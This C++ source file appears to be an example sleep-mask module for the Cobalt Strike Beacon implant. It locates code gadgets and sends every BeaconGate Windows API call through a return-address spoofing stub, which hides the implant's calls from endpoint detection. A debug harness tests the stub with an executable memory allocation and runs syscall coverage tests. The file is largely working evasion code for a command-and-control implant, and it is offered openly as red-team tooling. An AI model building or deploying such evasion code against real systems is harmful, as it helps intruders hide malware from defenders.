#include <windows.h>

#include "base\helpers.h"
#include "sleepmask.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library\debug.cpp"
#include "library\utils.cpp"
#include "library\stdlib.cpp"
#include "library\masking.cpp"
#include "library\gate.cpp"

// Additional include for main ret addr spoofing code.
#include "library\retaddrspoofing.cpp"

    /**
    * This example uses a global pointer to the RET_SPOOF_INFO struct
    * which is used by our assembly harness to perform return address
    * spoofing. The use of globals means we can use the existing
    * BeaconGate dispatcher code without having to re-implement our own.
    */
    static PRET_SPOOF_INFO gRetSpoofInfo = NULL;

    /**
    * Sleepmask-VS entry point
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL retAddrSpoofingInitialized = FALSE;
        static GADGETS gadgets;
        static RET_SPOOF_INFO retSpoofInfo;

#if ENABLE_LOGGING
        if (!retAddrSpoofingInitialized) PrintSleepMaskInfo(info);
#endif

        // [0] Initialise ret address spoofing gadgets if required.
        if (!retAddrSpoofingInitialized) {
            DLOGF("SLEEPMASK: Configuring return address spoofing gadgets...\n");
#ifdef _DEBUG
            // If debug, load wininet so we can locate required gadgets.
            DFR_LOCAL(KERNEL32, LoadLibraryA)
            LoadLibraryA("Wininet.dll");
#endif
            // Locate gadgets to use in ret addr spoofing.
            if (FindGadgets(&gadgets)) {
                // If success, set global ptr to RET_SPOOF_INFO.
                gRetSpoofInfo = &retSpoofInfo;
            }
            retAddrSpoofingInitialized = TRUE;
        }

        // [1] If we have a BeaconGate call, set up the required gadgets.
        if (gRetSpoofInfo && functionCall != NULL) {
            // Scrub the retInfo struct and re-populate it for new call.
            _memset(gRetSpoofInfo, 0, sizeof(RET_SPOOF_INFO));
            /**
            * This function will configure our global RetSpoofInfo structure which
            * is referenced by our asm stub to perform ret address spoofing. Additionally,
            * it will overwrite the functionCall->functionPtr to point to our asm stub.
            * By doing this, we can re-purpose the existing default BeaconGate code to
            * re-direct all incoming functions to our ret addr spoof harness.
            * This is just one example implementation; to avoid using globals, we could
            * re-implement the BeaconGate code (similar to the draugr-sleepmask example).
            */
            SetupFunctionCall(functionCall, &gadgets, gRetSpoofInfo);
        }

        DLOGF("SLEEPMASK: Calling %s with spoofed return address\n", winApiArray[functionCall->function]);
        BeaconGateWrapper(info, functionCall);

        return;
    }
}

// Define a main function for the debug build.
#if defined(_DEBUG)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]) {
    /**
    * [0] Run a quick test BeaconGate example.
    *
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    // [1] Check asm harness is passing args correctly.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing args are passed correctly");
    // Note: It doesn't impact the test but SetupFunctionCall will think this is INTERNETOPENA as the enum is 0.
    TestArgumentsArePassedCorrectlyWrapper();

    // [2] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

#endif
